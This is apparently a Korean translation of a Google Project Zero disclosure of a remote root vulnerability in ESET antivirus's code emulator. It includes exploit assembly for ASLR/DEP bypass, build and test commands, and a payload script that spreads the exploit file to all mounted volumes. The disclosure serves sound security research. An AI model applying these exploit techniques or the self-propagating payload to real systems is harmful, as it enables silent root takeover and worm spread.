---
layout: post
title: "(번역)Analysis and Exploitation of an ESET Vulnerability"
date:   2015-07-09 22:00:25
categories: [translation, googleprojectzero]
---

[original post](http://googleprojectzero.blogspot.kr/2015/06/analysis-and-exploitation-of-eset.html)

### 우리는 보안 소프트웨어의 위험성(risk)과 이익(benefit) 사이의 트레이드오프 관계를 이해하고 있는가? 

Tavis Ormandy, 2015년 6월

#소개 
많은 백신 제품들은 언패커들을 몇 사이클 정도 실행시킨 후에 시그니처를 적용하기 위해 에뮬레이션 기능을 포함하고 있다. ESET NOD32 제품은 [minifilter](https://msdn.microsoft.com/en-us/library/windows/hardware/ff557282(v=vs.85).aspx) 또는 [kext](https://developer.apple.com/library/mac/documentation/Darwin/Conceptual/KEXTConcept/KEXTConceptIntro/introduction.html)를 이용하여 실행가능한 코드가 탐지되면 디스크 I/O를 가로챈 후 분석 및 에뮬레이트를 한다.

공격자들은 웹브라우저, 이메일, 인스턴트메신저(IM), 파일공유, 네트워크저장소, USB 외에도 수백개의 다른 벡터를 통해서 I/O를 발생시킬 수 있다. 메시지나 파일, 이미지 또는 다른 데이터들을 수신할 때마다 신뢰할 수 없는 데이터가 디스크를 거쳐갈 가능성은 항상 열려있다. 신뢰할 수 없는 코드의 에뮬레이션을 유발하는 것은 공격자들에겐 너무나 쉽기 때문에 에뮬레이터는 견고하고 분리되어있어야 한다. 

하지만 ESET의 에뮬레이션 기능을 분석해본 결과, 안전하지가 않다는 것을 밝혀냈으며 쉽게 공격을 당하거나 악용될 수 있다. 본 보고서는 ESET의 원격에서 루트권한을 탈취할 수 있는 익스플로잇 개발에 대한 내용을 설명하며, 공격자들이 어떻게 ESET 사용자들에 대한 보안을 훼손시킬 수 있는지를 보여준다. 이것은 이론적인 위험이 아니라 충분히 실제로 일어날 수 있으며, 최근 [근거](https://firstlook.org/theintercept/2015/06/22/nsa-gchq-targeted-kaspersky/)를 통해 실력이 뛰어난 공격자들이 백신 제품에 관심을 가지기 시작한 것을 알 수 있다.

#FAQ


### 어떤 플랫폼들이 영향을 받는가?
ESET 시그니처들의 형태는 실행가능한 코드이며, DAT와 NUP파일로부터 런타임에 언패킹되어 모듈로 로드된다. DAT 파일은 모든 플랫폼 및 버전들이 공유하기 때문에, 결과적으로 모든 플랫폼이 영향을 받는다.


### 어떤 제품 및 버전이 영향을 받는가? 
현재 지원대상인 모든 ESET 버전 및 에디션은 취약한 코드를 모두 공유한다.

아래는 취약한 제품들 중 일부 목록이다.


* ESET Smart Security for Windows
* ESET NOD32 Antivirus for Windows
* ESET Cyber Security Pro for OS X
* ESET NOD32 For Linux Desktop
* ESET Endpoint Security for Windows and OS X
* ESET NOD32 Business Edition

### 기본(default) 설정도 영향을 받는가?
영향을 받는다.

### "실시간 스캔" 기능을 비활성화 시켜도 취약한가?
만약 실시간 스캔 기능을 비활성화시킨다면, 컨텍스트 메뉴나 GUI 상에서 수동으로 파일을 스캔할 경우에만 영향을 받는다.

하지만 기억할 점은, 실시간 스캔을 비활성화시키면 ESET가 주기적으로 최대한의 보호를 받고 있지 못하다는 알림을 띄워 실시간 스캔을 활성화시키도록 유도할 것이다. 

### 분석을 위해 익스플로잇을 공개했는가?
실제로 동작하는 [익스플로잇](https://code.google.com/p/google-security-research/issues/detail?id=456)을 보고서와 함께 첨부했다.

### 업데이트는 공개되었는가?
ESET는 스캔 엔진에 대한 [업데이트](http://www.virusradar.com/en/update/info/11824)를 2015년 6월 22일에 배포했다. 


# 영향
ESET을 실행하고 있는 네트워크에 연결된 컴퓨터라면, 완전히 보안성을 훼손 당할 수 있다. 완전하게 보안성이 훼손된다는 의미는, 접근권한과 무관하게 시스템상의 파일읽기/쓰기/수정, 루트킷 및 원하는 프로그램 설치, 카메라/마이크로폰/스캐너 등의 하드웨어 장비에 접근, 시스템의 모든 활동(키스트로크, 네트워크 트래픽)의 로깅 등이 모두 가능하다는 말이다.

완전히 보안성이 훼손당했다는 증거(익스플로잇이 실행되었다는 증거)는 전혀 사용자에게 나타나지 않는다. 왜냐면 disk I/O는 운영체제의 일반적인 행위의 일부분이기 때문이다. 또한 익스플로잇을 하기 위해 사용자의 개입이 전혀 필요없기 때문에 이 취약점은 [웜](https://en.wikipedia.org/wiki/Computer_worm)으로 악용될 수 있다. ESET를 배포하여 사용하고 있는 기업환경에서는 아주 빠르게 전파되어 순식간에 기업전체가 보안성을 훼손당할 수 있으며 사업관련 데이터, PII, 영업비밀, 백업, 회계문서 등이 모두 유출되거나 삭제될 수 있다.

이 모든것은 스캔 작업자체가 높은 권한을 가지고 있기 때문에 가능한 시나리오다. 윈도우 네트워크의 경우, ekm.exe 프로세스를 장악하여 공격자에게 NT AUTHORITY\SYSTEM 권한을 부여할 수 있다. 맥과 리눅스는 esets_daemon 프로세스를 장악하여 공격자에게 루트권한을 부여할 수 있다. 

Figure 1.은 익스플로잇 시나리오를 설명하는 비디오다. 일반적인 사용자가 ESET NODE32 비지니스 에디션을 설치한 환경(기본설정)에서 링크를 클릭할 경우, 공격자는 루트권한으로 임의의 명령어를 실행할 수 있다. 악성 링크가 유일한 공격벡터는 아니며, 수백개의 가능한 벡터중 하나를 설명한 것에 불과하다. 

모든 버전,플랫폼 및 제품들은 기본설정 환경에서 영향을 받으며, 익스플로잇 시나리오와 가능한 익스플로잇 페이로드들에 대한 더 많은 예제를 알고 싶다면, 아래 "Sample Payloads"를 참고하면 된다.  

<iframe width="420" height="315" src="https://www.youtube.com/embed/Sk-CuFMXods" frameborder="0" allowfullscreen></iframe>
Figure 1. ESET 기본설치 환경에서 웹브라우저를 통한 공격 시나리오 동영상 http://youtu.be/Sk-CuFMXods


# 기술적인 분석

위 Figure 1에서 익스플로잇한 취약점은 에뮬레이트된 스택 작업들을 섀도우(또는 복제)하는 ESET NOD32 시그니처에 존재한다. 시그니처는 최소 3개의 섹션과 IMAGE_SECTION_HEADER의 IMAGE_SCN_MEM_EXECUTE \| IMAGE_SCN_MEM_READ \| IMAGE_SCN_MEM_WRITE \| IMAGE_SCN_CNT_CODE 속성이 필요하다. 

엔트리포인트의 첫번째 명령어는 CALL이 필수이며, CALL은 PUSHA 명령어와 PUSHF 명령어가 연속으로 존재하는 곳으로 분기해야 한다. 

이 조건들이 만족된다면, 시그니처는 x86 에뮬레이터 상에서 80,000 사이클 동안 코드를 single-step 한다. 각각의 명령어를 실행한 후에는 바로전에 실행한 명령어의 opcode가 스택 작업이였는지 체크한다. 만약 스택 작업이였다면, PUSH, POP 그리고 ESP 레지스터에 대한 산술연산을 자신의 40 바이트 스택 버퍼에 그대로 섀도우한다. 섀도우 스택의 목적은 악성코드들이 일반적으로 메모리에 쓴다고 알려진 값들이 PUSHA;PUSHF 명령어로 할당된 공간에 써지는지 확인하여 악성코드를 탐지하는 것이다. 이런 목적 때문에 40 바이트밖에 안되는 작은 섀도우 스택을 사용하는 것으로 예상되며, 아마도 엔트리포인트 난독화를 탐지하는 방법인 것 같다.

아래는 ESP에 대한 산술연산을 섀도우하는 코드이다. 

{% highlight nasm %}
load:F33E0BD3 CheckEspArith:                       
load:F33E0BD3                 cmp     esi, 6  (a)
load:F33E0BD6                 jnz     short loc_F33E0C06
load:F33E0BD8                 cmp     [ebp+Instruction.Operand+4], 1
load:F33E0BDF                 jnz     short loc_F33E0C06
load:F33E0BE1                 cmp     [ebp+Instruction.Operand], 124h
load:F33E0BEB                 jnz     short loc_F33E0C06
load:F33E0BED                 cmp     [ebp+Instruction.Operand1+4], 9
load:F33E0BF1                 jnz     short loc_F33E0C06
load:F33E0BF3                 mov     eax, [ebp+Instruction.Operand1+24h] (b)
load:F33E0BF6                 shr     eax, 2
load:F33E0BF9                 sub     ebx, eax (c)
load:F33E0BFB                 movzx   eax, [ebp+Instruction.InstructionSize]
load:F33E0BFF                 add     edi, eax (d)
load:F33E0C01                 jmp     InstructionComplete
{% endhighlight %}


(a) 비교문은 산술연산 클래스의 명령어인지 확인하는 것이며, 그 뒤로 명령어의 인자(operand)를 확인하는 코드가 나온다. (b)에서는 상수 인자를 가져오고 (c)는 새도우 스택 포인터에서 가져온 인자값을 뺀다. 가상 프로그램 카운터는 (d)명령어 다음 위치로 증가한다.


{% highlight nasm %}
oad:F33E0B61 CheckPush:
load:F33E0B61                 cmp     esi, 10Eh       (a)
load:F33E0B67                 jnz     short CheckPop
load:F33E0B69                 push    [ebp+Instruction.BranchRelated]
load:F33E0B6F                 lea     eax, [ebp+Instruction.Operand]
load:F33E0B75                 push    eax
load:F33E0B76                 call    GetOperand      (b)
load:F33E0B7B                 mov     [ebp+ebx*4+EmulatedStack], eax (c)
load:F33E0B7F                 inc     ebx
load:F33E0B80                 movzx   eax, [ebp+Instruction.InstructionSize]
load:F33E0B84                 add     edi, eax        ; Increment Program Counter
load:F33E0B86                 cmp     ebx, 0Ah        (d)
load:F33E0B89                 jb      InstructionComplete
load:F33E0B8F
load:F33E0B8F StackOutOfBounds:                       ; CODE XREF: sub_F33E0A70+D7j
load:F33E0B8F                                         ; sub_F33E0A70+DFj ...
load:F33E0B8F                 mov     ecx, [ebp+EmulatorObject]
load:F33E0B92                 call    ShutdownEmulator
{% endhighlight %}


(a)는 PUSH 명령어가 존재하는지 체크하는 코드이다. 인자는 에뮬레이터의 상태정보에서 가져오며(b) 이를 섀도우 스택에 저장한다(c). 스택포인터는 (d)에서 10 DWORDS 값과 비교해서 스택 경계를 벗어나지 않도록 한다.


POP 명령어도 마찬가지 패턴으로 구현되어있다.

{% highlight nasm %}
load:F33E0B9E CheckPop:                          
load:F33E0B9E                 cmp     esi, 0F3h             (a)
load:F33E0BA4                 jnz     short loc_F33E0BD3
load:F33E0BA6                 cmp     [ebp+Instruction.Operand+4], 1  (b)
load:F33E0BAD                 jnz     short loc_F33E0B8F
load:F33E0BAF                 test    ebx, ebx  (c)
load:F33E0BB1                 jz      short loc_F33E0B8F
load:F33E0BB3                 mov     ecx, [ebp+Instruction.Operand]
load:F33E0BB9                 dec     ebx
load:F33E0BBA                 and     ecx, 7
load:F33E0BBD                 mov     eax, [ebp+ebx*4+EmulatedStack] (c)
load:F33E0BC1                 mov     ds:EmulatedRegisters[ecx*4], eax
load:F33E0BC8                 movzx   eax, [ebp+Instruction.InstructionSize]
load:F33E0BCC                 add     edi, eax
load:F33E0BCE                 jmp     InstructionComplete
{% endhighlight %}


해당 코드는 POP 명령어를 제어하며, 명령어 클래스는 (a)에서 체크한다. 또한 레지스터에  데이터를 저장하는 명령어인지도 (b)에서 검증하며, 마지막으로 섀도우 스택 포인터가 0이 아닌지 확인한다(c). 왜냐면 만약 섀도우 스택 포인터가 0인 상태에서 POP 연산을 하게되면 포인터가 스택의 영역밖으로 벗어나기 때문이다. 

버그는 새도우 스택 포인터가 스택 경계를 벗어나지 않도록 검증하는 부분이 ESP에 대한 산술연산을 이용하면 우회가 가능하다는 것이다. 아래 figure 3은 설명한 동작에 대한 pseudo 코드다. 

{% highlight c++ %}
DWORD ShadowStack[10] = {0};
DWORD ShadowStackPointer = 0;

for (Cycles = 0; Cycles < 80000; Cycles++) {
    Emulator->Step(&ProgramCounter, &Instruction);

    if (Instruction.Class == PUSH) {
        ShadowStack[ShadowStackPointer++] = Emulator->GetOperandValue();
        if (ShadowStackPointer >= 10)
            Emulator->Shutdown();
    }

    if (Instruction.Class == POP) {
       if (!ShadowStackPointer || Instruction.Operand[1].Type != REGISTER)
            Emulator->Shutdown();
       Registers[Instruction.Operand[1].Register] = ShadowStack[ShadowStackPointer--];
    }

    if (Instruction.Class == ADD && Instruction.Operand[0].Register == REG_ESP) {
        // BUG!
        ShadowStackPointer -= Instruction.Operand[1].Value / 4;
    }

    if (Emulator->Fault) {
        Emulator->Shutdown();
    }
}   

Emulator->Shutdown();
{% endhighlight %}
Figure 3. 에뮬레이션 루틴에 대한 Pseudo 코드

이와 같은 3 종류의 새도우 스택 동작을 이용하면, 익스플로잇의 기본요소(primitive)인 임의의 데이터를 원하는 위치에 쓰는 행위가 가능하여 결과적으로 에뮬레이터를 제어할 수 있다. 본 보고서의 뒷부분에서는 이 취약점을 이용하는 익스플로잇을 어떻게 개발하는지, 그리고 신뢰성이 높고 특정 플랫폼에 국한되지 않는(cross-platform) 익스플로잇을 개발하기 위해 극복해야하는 제한 및 한계를 다룬다. 


### 익스플로잇 기본요소(primitive) 구축하기

산술연산을 이용해 포인터를 스택의 범위 밖으로 벗어나게 하고 PUSH와 POP 명령어로 상호작용함으로써 스탠다드 i586 머신코드를 이용해 에뮬레이터 내에서 진짜 스택의 값을 읽거나 데이터를 그곳에 쓸 수 있다. 

하지만 실행할 수 있는 명령어 개수는 제한되어 있으며 스택에는 딱 한번만 쓸 수 있다. 왜냐하면 PUSH 동작 이후에 새도우 스택 포인터가 범위를 벗어났는지 체크를 하기 때문이다. 읽기의 경우, POP 명령어는 스택 포인터가 0이 아닌지만 확인하기 때문에 무제한으로 읽을 수 있다. 

우린 가상의 스택 포인터(섀도우 스택)를 악용하는것이기 때문에 지역변수들은 레지스터 또는 .data 영역에 저장을 해야한다. 80K의 사이클은 충분해 보일 수 있지만 다양한 ESET 제품들을 신뢰성있게 익스플로잇하기 위해서 gadget을 찾다보면 금방 사이클이 소모된다.  

### 익스플로잇 mitigation 뛰어넘기

첫번째 단계는 새도우 스택이 어디에 위치하고 있는지 알아내는 것이다. 왜냐하면 스택 작업들은 스택의 베이스 주소를 기준으로 상대적인 위치에서 동작하기 때문이다. 우리가 쓰거나 읽기를 할 수 있는 추측 가능한 메모리 위치는 존재하지 않지만, 실제 스택 프레임에 포인터를 push할 수 있고 실제 스택에 있는 저장된 스택포인터(직전 스택 프레임의 스택포인터)를 가상 레지스터로 가져올 수 있다. 

우리가 몇 가지의 메모리 주소들을 알아낸다면 ASLR을 우회할 수 있으며, 인접한 메모리 영역으로 행동반경이 더이상 제한되어있지 않을 것이다. 이렇게 하기 위해서는 섀도우 스택 포인터가 가리키는 위치를 임의의 인덱스로 설정할 수 있어야하는데, 5 단계의 작업을 거쳐 섀도우 스택 포인터의 상위 bit들을 쉬프트해 제거해버리면 가능하다. 실제 인덱스 계산은 대략 아래와 같다.
* ESP에 대한 산술연산

{% highlight c++ %}
ShadowStackPointer = ShadowStackPointer - ((unsigned) Index >> 2);
{% endhighlight %}

위 수식은 오버플로우때문에 한번의 작업으로 새도우 스택포인터를 증가시키는것은 불가능하다. 대신에 4번의 작업을 통해 다음 4의 배수로 만든 다음, 원하는 값으로 감소시키는 방법을 쓸 수 있다. 아래는 새도우 스택포인터를 123으로 만드는 방법을 시뮬레이션한 예이다.

{% highlight c++ %}
(gdb) p 123 / 4 + 1
$1 = 31
(gdb) p/x 0 - (-(31U * 4) >> 2)
$2 = 0xc000001f
(gdb) p/x 0xc000001f - (-(31U * 4) >> 2)
$3 = 0x8000003e
(gdb) p/x 0x8000003e - (-(31U * 4) >> 2)
$4 = 0x4000005d
(gdb) p   0x4000005d - (-(31U * 4) >> 2)
$5 = 124
(gdb) p 124 - (((4U - (123 % 4)) * 4) >> 2)
$6 = 123
(gdb) 
{% endhighlight %}

이 요소를 PUSH/POP과 조합하면 스택의 임의 인덱스와 상호작용할 수 있다. Figure 4는 x86 코드를 이용, 에뮬레이터 내부에서 어떻게 임의의 스택 인덱스에 접근할 수 있는지 설명하는 코드이다.


{% highlight nasm %}
 accessframe:
    ;
    ; Retrieve information from our stack frame.
    ;
    ; EDI   Real return address
    ; ESI   Real base pointer
    ;
    ;
    ; The stack frame looks like this:
    ;
    ;   -00000030 ShadowStack     dd 10 dup(?)
    ;   -00000008 ModifyCount     dd ?
    ;   -00000004 CycleCount      dd ?
    ;   +00000000  s              db 4 dup(?)
    ;   +00000004  r              db 4 dup(?)
    ;   +00000008 EmulatorObject  dd ?
    ;
    ; So s is 30h + 8 + 4 bytes from the base of ShadowStack. Because the
    ; ShadowStackPointer is an index into an array of DWORDS, we need to set it
    ; to (30h + 8 + 4) / 4 = 15.
    ;
    ; Then we can load s (saved register), and r (return address)
    ; onto virtual registers. To calculate the value of real EBP, we take the
    ; previous frame's sp and subtract our frame size.

    ; We need to move the shadow stack pointer back in five stages.
    add     esp, byte -(4 << 2)     ; SSP=0xC0000004
    add     esp, byte -(4 << 2)     ; SSP=0x80000008
    add     esp, byte -(4 << 2)     ; SSP=0x4000000C
    add     esp, byte -(4 << 2)     ; SSP=0x00000010
    add     esp, byte  (1 << 2)     ; SSP=0x0000000F
    pop     esi                     ; Load the real previous frame's sp.
    pop     edi                     ; Load the return address.
    sub     esi, byte 0x5C          ; Adjust ESI to point to our real stack frame.
{% endhighlight %}

우리는 이제 스택 베이스 주소로부터의 오프셋을 계산해냄으로써 섀도우 스택 포인터가 임의의 메모리 주소를 가리키도록 할 수 있다. 만약 섀도우 스택 포인터가 .text 영역을 가리키게 한다면, 메모리 주소 공간을 스캔해서 gadget들을 찾아 DEP를 우회할 수 있다. 

맥OS의 경우, gadget을 통해 실행 흐름을 쉘코드로 변경해주는만으로 충분하다. 이것은 ESET가 MH_NO_HEAP_EXECUTION 플래그를 Mach 헤더에 설정하지 않음으로써 DEP를 비활성화시키기 때문이다. 윈도우와 리눅스는 완전한 ROP 체인이 필요하다. 

{% highlight bash %}
$ otool -hv /Applications/ESET\ Cyber\ Security\ Pro.app/Contents/MacOS/esets_daemon 
/Applications/ESET Cyber Security Pro.app/Contents/MacOS/esets_daemon:
Mach header
      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
   MH_MAGIC    I386        ALL  0x00     EXECUTE    27       3184   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE
{% endhighlight %}

만약 복잡한 gadget 체인 때문에 사이클이 더 필요하다면, 첫단계 gadget 체인을 통해 사이클 카운트를 초기화하여 익스플로잇 완성을 위한 무제한의 시간을 얻을 수 있다. 


{% highlight nasm %}
findgadget:
    ;
    ; Search for simple gadget at [ESP] using stack operations.
    ;
    ; EDI       Current search location for gadget.
    ; EAX       Last DWORD read from [EDI].
    ;  BL       Byte from [EDI-1].
    ; ECX       Byte index into current DWORD
    ; EBP       Constant Mask
    ; EDX       Constant 4
    ;
    ; This loop uses a modified port of Algorithm 6-2 (Find leftmost 0-byte)
    ; from "Hackers Delight" by Henry Warren, ISBN 0-201-91465-4. The
    ; .nextdword loop is where we burn all our cycles, so optimizing for the
    ; common case doubles our search space.
    ;
    ReqOpcode   equ 0xFF    ; register indirect branch
    ReqOperands equ 0x13112321
    xor     ecx, ecx        ; initialize loop counter
    mov     ebp, 0x7F7F7F7F ; initialize mask
    mov     edx, 4          ; constant
    pop     ebx             ; initialize BL
    bswap   ebx             ; rearrange so high byte is in bl
    dec     edi             ; adjust for start of search
   .nextdword:
    pop     eax             ; fetch another dword to examine
    bswap   eax             ; reorder bytes
    not     eax             ; invert bits because this code searches for 0x00
    mov     ecx, eax        ; ecx is a copy of dword to scan we can modify
    and     ecx, ebp        ; y & 0x7f7f7f7f
    add     ecx, ebp        ; + 0x7f7f7f7f
    or      ecx, eax        ; y | x
    or      ecx, ebp        ; y | mask
    not     eax             ; restore bits, we need them in either case
    xor     ecx, byte ~0    ; ~y; xor instead of not because ZF
    jnz     .matchfound     ; was there a 0xFF?
   .nomatch:
    sub     edi, edx        ; adjust current search pointer
    mov     bl, al          ; save byte for operand match
    jmp     short .nextdword; next dword
{% endhighlight %}
Figure 5. ASLR/DEP 우회 및 마이너 버전에서의 변화 허용을 위한 call [reg] gadget을 찾는다. 에뮬레이터에서 리턴하는 경우, [ECX]는 스캔이 되고 있는 파일의 시작 지점을 가리키고 있을 것이다. 이 의미는 스캔중인 악성코드의 코드를 실제 CPU에서 재실행한다는 뜻이다.

Figure 5는 POP 명령어를 통해 메모리 주소 공간을 탐색하는것을 보여준다. 이것은 매우 자원이 많이드는 비싼 동작이기 때문에 시퀀스는 보통의 경우 싸이클수를 줄일 수 있도록 최적화되어 있다. 만약 좋은 후보를 발견할 경우, 리턴주소를 덮어쓰고 에뮬레이터를 종료한다.

### 익스플로잇 가능성 테스트

분석을 돕기위해 삽입된 스크립트를 실행하는 샘플 익스플로잇을 보고서와 함께 제공하며, 이는 아래 링크에서 다운로드 가능하다. 

https://code.google.com/p/google-security-research/issues/detail?id=456

첨부한 익스플로잇을 빌드하고 테스트하려면, 실수로 시스템이 익스플로잇 되는것을 방지하기 위해 우선 실시간 파일시스템 검색 기능을 비활성화시켜야 한다. 익스플로잇을 빌드하기 위해서는 애플에서 배포하는 XCode 커맨드라인 툴 패키지가 설치되어 있어야 한다. 만약 해당 패키지가 설치되어어있지 않다면, 커맨드라인에 make를 입력할 시 자동으로 패키지 설치 안내 메시지가 출력될 것이다.

{% highlight bash %}
$ ls -l
total 28K
-rw------- 1 taviso eng 17K Jun 18 12:45 esetemu.asm
-rw------- 1 taviso eng 605 Jun 18 10:31 Makefile
-rw------- 1 taviso eng 514 Jun 18 15:58 payload.sh
{% endhighlight %}

payload.sh 파일은 익스플로잇에 삽입되어 있고, 익스플로잇이 성공했을 경우 실행된다.

{% highlight bash %}
$ cat payload.sh 
#!/bin/sh
#
# This is the payload code run as root in the context of esets_daemon after
# successful exploitation.
#
osascript -e 'tell application "Finder" to set desktop picture to POSIX file "/usr/share/httpd/icons/bomb.png"'
/Applications/Calculator.app/Contents/MacOS/Calculator &
echo w00t
uname -a; date; id
{% endhighlight %}

make를 실행하며 익스플로잇을 빌드하면 되고, esetemu.bin 파일에는 결과가 저장된다. 파일 확장자는 취약점에 중요하지않으며, 심지어 .txt도 가능하다. 

{% highlight bash %}
$ make
gzip -9c < payload.sh | base64 | tr -d '\n' >> payload.inc
nasm -O0 -f bin -D__MACOS__ -o esetemu.bin esetemu.asm
{% endhighlight %}

익스플로잇을 테스트하기 위해서는, ESET 설치로부터 esets_scan 유틸리티를 사용해야 한다. 자신의 사용자 계정으로 실행되며, 만약 뭔가 잘못된다면 크래시나 스크립트의 문법 에러 등을 통해 눈치챌 수 있다. 

{% highlight bash %}
$ /Applications/ESET\ Cyber\ Security\ Pro.app/Contents/MacOS/esets_scan esetemu.bin

ESET Command-line scanner, (C) 1992-2011 ESET, spol. s r.o.
Module loader, version 1056 (20150113), build 1082
Module perseus, version 1456 (20150512), build 1687
Module scanner, version 11810 (20150619), build 24399
Module archiver, version 1228 (20150528), build 1230
Module advheur, version 1154 (20150129), build 1120
Module cleaner, version 1109 (20150519), build 1140

Command line: esetemu.bin 

Scan started at:   Thu Jun 18 21:57:48 2015
w00t
Darwin Macs-Mac.local 13.0.0 Darwin Kernel Version 13.0.0: Thu Sep 19 22:22:27 PDT 2013; root:xnu-2422.1.72~6/RELEASE_X86_64 x86_64
Thu Jun 18 21:57:48 PDT 2015
uid=501(macuser) gid=20(staff) groups=20(staff),401(com.apple.sharepoint.group.1),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),33(_appstore),100(_lpoperator),204(_developer),398(com.apple.access_screensharing),399(com.apple.access_ssh)
{% endhighlight %}

라이브 시스템을 대상으로 익스플로잇을 실험해보는 제일 쉬운방법은 실시간 검사기능을 활성화하고 파일을 cat으로 오픈하는 것이다.

{% highlight bash %}
$ cat esetemu.bin > /dev/null
{% endhighlight %}

만약 익스플로잇이 성공하면, payload.sh가 루트권한으로 실행되었을 것이다. 주의할점은 stdout이나 stderr를 이 모드에서는 볼 수 없기 때문에 만약 원한다면 다른파일로 출력결과를 리다이렉트 시켜야한다. 만약 익스플로잇이 제대로 동작을 한다면, 이메일 첨부파일이나, 브라우저 다운로드, 웹앱 업로드 등으로 테스트 가능하다.

ESET 데몬은 종료처리를 눈에띄지않게 하기때문에 사용자는 익스플로잇이 실행되었는지 알 수가 없다.

### 페이로드 예제(Sample Payload)

####USB & Removable Disk 익스플로잇

익스플로잇을 .hidden이라고 명명하고 마운트된 볼륨의 루트 디렉토리에 위치시키면(예. /Volumes/MyDrive/.hidden), 디바이스가 삽입될 경우 자동으로 실행된다. ESET CyberSecurity Pro6은 기본설정에서 USB/CD-ROM/DVD 장치를 입력할 경우 알림창을 띄우지만, 어떤 옵션을 선택하더라도(또는 아무 옵션을 선택하지 않더라도) 익스플로잇은 성공적으로 실행된다.

아래와 같이 다른 마운트된 볼륨으로 전파를 시킬 수 있다.

{% highlight bash %}
$ cat payload.sh 
#!/bin/sh
#
# This is the payload code run as root in the context of esets_daemon after
# successful exploitation.
#
# This silly example demonstrates simple propagation.
#

# Discard output
exec &> /dev/null

# Do something malicious.
/Applications/Calculator.app/Contents/MacOS/Calculator &

# Is there an exploit on a Volume?
name="$(find /Volumes -type f -depth 2 -name .hidden -size 79911c | head -n 1)"

# Yes, propagate to all other disks.
test -f "${name}" && find /Volumes -type d                          \
                                   -depth 1                         \
                                   -exec cp -f -- "${name}" {} \;   \
                                   -exec sleep 1 \;
{% endhighlight %}

이 기술은 사용자와의 상호작용이 없이 ESET가 배포된 망분리된 네트워크를 순회할 수 있게 해준다. 이것은 윈도우 네트워크에서도 가능하며, 간단하게 desktop.ini나 autorun.ini를 대신 사용하면 된다.

#### E-Mail 익스플로잇

익스플로잇을 Mail.app, Outlook 등의 사용자에게 MIME 첨부 형태로 전송하면 사용자와의 상호작용이 전혀 없어 자동으로 익스플로잇이 되는것을 허용한다. 새로운 이메일을 읽거나 열지 않아도 단지 수신하는것만으로 익스플로잇은 동작한다.

#### 웹 익스플로잇

익스플로잇은 공격자의 웹사이트에서 호스팅되거나, 신뢰가능한 사이트들에 이미지 형태로 업로드될 수 있다. 또는 HTML5 어플리케이션 캐시, 다운로드, 아니면 단지 text/html 형태로 익스플로잇을 제공하는것으로 충분하다. 
 

#결론
취약점을 찾고, 분석하고 익스플로잇하는데는 몇일밖에 걸리지 않는 작업이였다. ESET는 우리에게 익스플로잇 방어기술들을 향상시켜 미래에는 익스플로잇이 더 어렵도록 작업하고 있다고 연락이 왔다. 


#Acknowledgements
본 취약점은 구글 프로젝트 제로의 Tavis Ormandy에 의해 발견됨

#Reference
1. http://googleprojectzero.blogspot.kr/2015/06/analysis-and-exploitation-of-eset.html
